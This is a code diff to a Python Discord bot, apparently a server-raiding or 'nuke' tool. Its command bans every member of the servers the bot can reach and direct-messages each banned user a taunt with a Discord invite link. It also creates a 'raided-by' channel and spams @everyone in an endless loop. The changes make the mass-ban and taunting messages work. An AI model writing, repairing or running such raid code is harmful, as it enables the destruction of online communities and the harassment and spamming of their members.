@@ -169,11 +169,10 @@ async def nuke_server_fr(ctx):
 
         all_members_list = []
 
-        async def members(ctx):
-            for guild in bot.guilds:
-                for member in guild.members:
-                    all_members_list.append(member)
-
+        for guild in bot.guilds:
+            for member in guild.members:
+                all_members_list.append(member)
+                
         async def nuke_channel_2(txt):
             if str(txt.author.id) != '762152955382071316':
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
@@ -199,16 +198,18 @@ async def nuke_server_fr(ctx):
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
-        async def ban(ctx1, member: discord.Member, *, reason=None):
+        async def ban(ctx1, member1: discord.Member, *, reason=None):
             try:
-                await member.ban()  # Bans the member.
+                await member1.ban()  # Bans the member.
+                await member1.send(f'GG Noob! One of your servers {guild.name} got RAIDED and you were BANNED '
+                                   f'lol\nJoin https://discord.gg/uAsCWzkNZd')
             except:
                 None
             finally:
                 None
 
         for member in all_members_list:
-            await ban(ctx1=ctx, member=member)
+            await ban(ctx1=ctx, member1=member)
 
         while True:
             await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
